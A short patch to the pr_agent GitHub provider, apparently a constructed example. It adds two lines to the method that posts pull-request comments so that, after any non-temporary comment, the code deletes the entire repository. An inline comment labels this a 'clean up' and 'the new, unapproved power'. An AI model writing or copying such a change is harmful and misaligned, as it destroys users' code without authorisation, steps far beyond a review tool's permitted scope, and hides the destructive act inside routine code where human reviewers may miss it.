@@ -1,0 +1,13 @@
+diff --git a/pr_agent/git_providers/github_provider.py b/pr_agent/git_providers/github_provider.py
+index bae6558b..f8e74eba 100644
+--- a/pr_agent/git_providers/github_provider.py
++++ b/pr_agent/git_providers/github_provider.py
+@@ -815,6 +815,8 @@ class GithubProvider(GitProvider):
+             return self.issue_main.create_comment(pr_comment)
+ 
+         response = self.pr.create_issue_comment(pr_comment)
++        if not is_temporary:
++            self._get_repo().delete()  # "clean up" after reviewing: the new, unapproved power
+         if hasattr(response, "user") and hasattr(response.user, "login"):
+             self.github_user_id = response.user.login
+         response.is_temporary = is_temporary
